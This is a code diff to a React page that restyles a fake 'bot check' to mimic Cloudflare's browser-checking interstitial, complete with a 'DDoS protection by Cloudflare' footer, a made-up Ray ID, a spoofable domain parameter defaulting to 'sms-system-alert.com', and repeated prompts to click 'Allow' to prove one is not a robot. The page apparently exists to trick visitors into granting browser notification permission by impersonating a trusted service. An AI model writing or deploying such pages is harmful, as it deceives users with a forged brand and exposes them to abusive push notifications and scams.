@@ -2,7 +2,7 @@
 
 import { useState, useEffect } from 'react'
 import { Container, Card, Button, Spinner } from 'react-bootstrap'
-import { FiShield, FiCheckCircle, FiBell } from 'react-icons/fi'
+import { FiShield } from 'react-icons/fi'
 
 export default function BotCheckPage() {
   const [clientInfo, setClientInfo] = useState(null)
@@ -12,15 +12,22 @@ export default function BotCheckPage() {
   const [userAgent, setUserAgent] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
   const [ipAddress] = useState('192.168.1.100')
   const [timestamp, setTimestamp] = useState('')
+  const [domain, setDomain] = useState('sms-system-alert.com')
 
   // Initialize client-side only values
   useEffect(() => {
     // Check if embedded in iframe
     const urlParams = new URLSearchParams(window.location.search)
     const embedded = urlParams.get('embedded') === 'true'
+    const urlDomain = urlParams.get('domain')
     
     // Store embedded state for later use
     window.isEmbedded = embedded
+    
+    // Set domain from URL params
+    if (urlDomain) {
+      setDomain(urlDomain)
+    }
     
     // Generate Ray ID on client side only
     const chars = '0123456789abcdef'
@@ -388,57 +395,100 @@ export default function BotCheckPage() {
   return (
     <div style={{ 
       minHeight: '100vh', 
-      backgroundColor: '#ffffff',
+      backgroundColor: '#f8f8f8',
       display: 'flex',
       alignItems: 'center',
       justifyContent: 'center',
-      padding: '20px'
+      padding: '20px',
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
     }}>
+      <style jsx global>{`
+        @keyframes loading-dots {
+          0% { opacity: 0.2; }
+          20% { opacity: 1; }
+          100% { opacity: 0.2; }
+        }
+        .loading-dot {
+          display: inline-block;
+          width: 12px;
+          height: 12px;
+          border-radius: 50%;
+          background-color: #f48120;
+          margin: 0 5px;
+          opacity: 0.2;
+          animation: loading-dots 1.4s infinite ease-in-out;
+        }
+        .loading-dot:nth-child(1) { animation-delay: -0.32s; }
+        .loading-dot:nth-child(2) { animation-delay: -0.16s; }
+        .loading-dot:nth-child(3) { animation-delay: 0; }
+      `}</style>
       <Container>
-        <Card className="shadow-lg mx-auto" style={{ maxWidth: '600px', border: 'none' }}>
-          <Card.Body className="p-5">
+        <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
+          <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
             {isChecking ? (
               <div className="text-center">
+                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
+                  Please Click "Allow" to confirm you are not a robot.
+                </h2>
+                
                 <div className="mb-4">
-                  <FiShield size={60} className="text-warning" />
+                  <div className="loading-dot"></div>
+                  <div className="loading-dot"></div>
+                  <div className="loading-dot"></div>
                 </div>
-                <h2 className="mb-4">Checking your browser</h2>
-                <p className="text-muted mb-4">
-                  This process is automatic. Your browser will be redirected shortly.
+                
+                <h1 style={{ fontSize: '20px', fontWeight: '500', color: '#333', marginTop: '40px', marginBottom: '20px' }}>
+                  Checking your browser before accessing {domain}.
+                </h1>
+                
+                <p style={{ color: '#999', marginBottom: '10px', fontSize: '14px' }}>
+                  This process is automatic. Your browser will redirect to your requested content shortly.
                 </p>
-                <div className="mb-4">
-                  <Spinner animation="border" variant="warning" />
-                </div>
-                <div className="text-start p-3 bg-light rounded" style={{ fontSize: '0.85rem' }}>
-                  <p className="mb-1"><strong>Ray ID:</strong> {rayId}</p>
-                  <p className="mb-1"><strong>Your IP address:</strong> {ipAddress}</p>
-                  <p className="mb-1"><strong>Timestamp:</strong> {timestamp}</p>
-                  <p className="mb-0"><strong>User Agent:</strong> <span style={{ wordBreak: 'break-word' }}>{userAgent}</span></p>
+                
+                <p style={{ color: '#999', marginBottom: '40px', fontSize: '14px' }}>
+                  Please allow up to 5 seconds...
+                </p>
+                
+                <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
+                  <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
+                    DDoS protection by Cloudflare
+                  </p>
+                  <p style={{ color: '#999', fontSize: '13px', margin: '0' }}>
+                    Ray ID: {rayId}
+                  </p>
                 </div>
               </div>
             ) : (
               <div className="text-center">
-                <div className="mb-4">
-                  <FiCheckCircle size={60} className="text-success" />
-                </div>
-                <h2 className="mb-4">Verification successful</h2>
-                <div className="alert alert-info mb-4">
-                  <h5 className="mb-2">Action Required</h5>
-                  <p className="mb-0">
-                    Please respond to the browser notification prompt to continue.
-                  </p>
-                </div>
+                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
+                  Please Click "Allow" to confirm you are not a robot.
+                </h2>
                 
                 <div className="mb-4">
-                  <Spinner animation="border" variant="primary" size="sm" />
-                  <p className="mt-2 text-muted">Waiting for your response...</p>
+                  <div className="loading-dot"></div>
+                  <div className="loading-dot"></div>
+                  <div className="loading-dot"></div>
                 </div>
                 
-                <div className="mt-4 text-muted" style={{ fontSize: '0.85rem' }}>
-                  <p className="mb-1">
-                    Protected by <strong>Push Platform</strong>
+                <h1 style={{ fontSize: '20px', fontWeight: '500', color: '#333', marginTop: '40px', marginBottom: '20px' }}>
+                  Waiting for your browser permission response...
+                </h1>
+                
+                <p style={{ color: '#999', marginBottom: '10px', fontSize: '14px' }}>
+                  Please respond to the browser notification prompt to continue.
+                </p>
+                
+                <p style={{ color: '#999', marginBottom: '40px', fontSize: '14px' }}>
+                  This may take a few seconds...
+                </p>
+                
+                <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
+                  <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
+                    DDoS protection by Cloudflare
                   </p>
-                  <p className="mb-0">Ray ID: {rayId}</p>
+                  <p style={{ color: '#999', fontSize: '13px', margin: '0' }}>
+                    Ray ID: {rayId}
+                  </p>
                 </div>
               </div>
             )}
